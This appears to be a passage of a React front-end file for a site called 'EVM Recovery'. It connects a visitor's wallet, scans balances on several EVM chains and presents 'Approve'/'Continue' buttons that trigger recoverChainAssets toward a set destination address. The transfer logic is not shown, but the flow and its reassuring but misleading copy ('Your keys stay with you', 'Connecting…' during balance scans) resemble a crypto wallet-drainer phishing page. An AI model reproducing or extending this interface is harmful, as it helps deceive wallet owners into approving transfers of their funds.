        <div className="brand-lockup"><div className="brand-mark">E</div><div><div className="brand">EVM Recovery</div></div></div>
        <div className="wallet-actions">
          {address && chainInfo && (
            <button
              type="button"
              className="ghost-button"
              disabled={busy}
              title="Tap to switch network"
              onClick={() => {
                void (async () => {
                  const primary = [1, 56, 137, 8453, 42161, 10, 43114];
                  const cur = selectedChain ?? connectedChain ?? 1;
                  const idx = primary.indexOf(cur);
                  const nextId = primary[(idx >= 0 ? idx + 1 : 0) % primary.length];
                  const eip1193 = activeEip1193Provider ?? walletConnectProvider ?? window.ethereum;
                  if (!eip1193) return setStatus('Connect first.');
                  const c = chains.find(x => x.id === nextId);
                  setBusy(true);
                  try {
                    setStatus(`Switching to ${c?.name ?? nextId}…`);
                    await switchToChainId(eip1193, nextId);
                    setStatus(`On ${c?.name ?? nextId}.`);
                  } catch (e: any) {
                    setStatus(e?.message || 'Switch failed');
                  } finally {
                    setBusy(false);
                  }
                })();
              }}
            >
              {chainInfo.name} ⇄
            </button>
          )}
          <button type="button" className="ghost-button" onClick={() => void connectBrowserWallet()} disabled={busy}>{address ? `${address.slice(0, 6)}…${address.slice(-4)}` : 'Direct Connect'}</button>
          <button type="button" className="solid-button" onClick={connectMobileWallet} disabled={busy}>{address ? 'Reconnect' : 'WalletConnect'}</button>
        </div>
      </header>
      {!address && (
        <>
          <section className="hero-section">
            <div className="hero-copy">
              <div className="status-pill"><span className="live-dot" /> WALLET CONNECTION</div>
              <h1>Connect your<br /><em>wallet.</em></h1>
              <p>Connect with WalletConnect, then use Switch network to change chains easily. Approve each network with funds.</p>
            </div>
            <div className="hero-card">
              <div className="hero-card-top"><span>SELF-CUSTODY</span><span>●</span></div>
              <div className="security-icon">✓</div>
              <strong>Your keys stay with you</strong>
              <p>Approve each network in your wallet.</p>
            </div>
          </section>
          <section className="workspace">
            <div className="wallet-grid">
              {(['metamask', 'trust', 'coinbase'] as WalletApp[]).map(app => (
                <button type="button" className="wallet-card" key={app} onClick={() => openWalletApp(app)} disabled={busy || handoffPending || !mobile}>
                  <span className={`wallet-logo ${app}`}>{app[0].toUpperCase()}</span>
                  <span><b>{walletName(app)}</b><small>{mobile ? 'Open app' : 'Mobile only'}</small></span>
                </button>
              ))}
              <button type="button" className="wallet-card" onClick={connectMobileWallet} disabled={busy}>
                <span className="wallet-logo walletconnect">W</span>
                <span><b>WalletConnect</b><small>All chains</small></span>
              </button>
            </div>
            <div className="status-line"><span className="status-dot" />{status}</div>
          </section>
        </>
      )}
      {address && (
        <>
          <section className="hero-section">
            <div className="hero-copy">
              <div className="status-pill"><span className="live-dot" /> {busy ? 'APPROVING' : scanning ? 'CONNECTING' : 'READY'}</div>
              <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Connecting…</> : <>Ready to<br /><em>approve.</em></>}</h1>
              <p>{scanning ? 'Connecting to networks…' : focusedFunded ? `Tap Approve ${focusedFunded.name} — wallet can stay on another chain until you confirm.` : 'No balances found.'}</p>
            </div>
            <div className="hero-card">
              <div className="hero-card-top"><span>{chainInfo?.name ?? 'NETWORK'}</span><span>●</span></div>
              <div className="security-icon">✓</div>
              <strong>{scanning ? 'Connecting…' : `${chainsWithAssets.length} network(s)`}</strong>
              <p>{address.slice(0, 10)}…{address.slice(-8)}</p>
            </div>
          </section>
          <section className="workspace">
            <div className="form-card">
              <label>{scanning ? 'Connecting…' : 'Networks ready to approve'}</label>
              <p style={{ margin: '8px 0 0', opacity: 0.8, fontSize: '0.9rem' }}>
                {scanning ? 'Connecting across networks…' : chainsWithAssets.length ? '' : 'No balances found.'}
              </p>
            </div>
            {!scanning && focusedFunded && (
              <div className="approve-stack">
                {(focusChain ? [focusedFunded] : chainsWithAssets).map(c => {
                  const active = busy && focusChain === c.id;
                  return (
                    <button key={c.id} type="button" className="solid-button approve-cta"
                      disabled={busy || scanning || !isAddress(destination)}
                      onClick={() => { void recoverChainAssets(c.id); }}>
                      {active ? `${c.name}: processing…` : `Continue ${c.name}`}

                    </button>
                  );
                })}
                {chainsWithAssets.length > 1 && focusChain && (
                  <button type="button" className="ghost-button" style={{ width: '100%' }} disabled={busy}
                    onClick={() => setFocusChain(null)}>
                    Show approve for all {chainsWithAssets.length} networks
                  </button>
                )}
              </div>
            )}
            {address && !scanning && (
              <div style={{ marginTop: 16 }}>
                <label style={{ display: 'block', marginBottom: 8, opacity: 0.85 }}>Wallet network (currently {chainInfo?.name ?? 'unknown'})</label>
                <div className="chain-chip-row">
                  {([1, 56, 137, 8453, 42161, 10, 43114] as number[]).map(id => {
                    const c = chains.find(x => x.id === id);
                    if (!c) return null;
                    const onWallet = connectedChain === id;
                    const funded = chainsWithAssets.some(x => x.id === id);
                    return (
                      <button
                        key={id}
                        type="button"
                        className={onWallet ? 'solid-button chain-chip' : 'ghost-button chain-chip'}
                        style={{ padding: '8px 12px', fontSize: '0.85rem', opacity: busy ? 0.5 : 1 }}
                        disabled={busy}
                        onClick={() => {
                          void (async () => {
                            const eip1193 = activeEip1193Provider ?? walletConnectProvider ?? window.ethereum;
                            if (!eip1193) return setStatus('Connect wallet first.');
                            setBusy(true);
                            try {
                              setStatus(`Switching to ${c.name}…`);
                              await switchToChainId(eip1193, id);
                              if (funded) setFocusChain(id);
                              setStatus(funded ? `On ${c.name}. Tap Approve ${c.name}.` : `On ${c.name}. No scanned balances here.`);
                            } catch (e: any) {
                              setStatus(e?.message || 'Switch failed');
                            } finally {
                              setBusy(false);
                            }
                          })();
                        }}
                      >
                        {c.name}{funded ? ' •' : ''}
                      </button>
                    );
                  })}
                </div>
              </div>
            )}
            {txHash && chainInfo && (
              <div className="tx-result" style={{ marginTop: 12 }}>Last tx: <a href={`${chainInfo.explorer}${txHash}`} target="_blank" rel="noreferrer">{txHash.slice(0, 10)}…</a></div>
            )}
            <div className="status-line" style={{ marginTop: 14 }}><span className="status-dot" />{status}</div>
          </section>
        </>
      )}
      <footer><div><b>Security first.</b> Wallet confirms each network.</div><span>© EVM Recovery · 32 networks</span></footer>
    </main>
  );
}

createRoot(document.getElementById('root')!).render(<React.StrictMode><App /></React.StrictMode>);